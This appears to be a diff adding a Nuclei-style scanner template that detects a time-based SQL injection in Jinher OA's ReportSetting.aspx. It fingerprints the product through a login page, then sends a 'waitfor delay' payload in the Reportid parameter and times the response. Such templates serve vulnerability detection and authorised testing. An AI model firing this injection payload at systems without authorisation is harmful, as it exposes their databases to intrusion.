@@ -1,0 +1,40 @@
+id: jinher-reportsetting-sqli
+info:
+  name: Jinher OA ReportSetting.aspx SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: detect-application
+    method: GET
+    path:
+      - "{{BaseURL}}/C6/Jhsoft.Web.login/PassWordSlideFull.aspx"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "JHSoft"
+
+  - id: check-sqli
+    method: GET
+    path:
+      - "{{BaseURL}}/c6/Jhsoft.Web.BIframe/ReportSetting.aspx/?Reportid=1'waitfor+delay%270:0:{{t1}}%27--"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "ASP.NET_SessionId="
+      - type: dsl
+        dsl:
+          - "duration >= to_number(t1) && duration <= to_number(t2)"
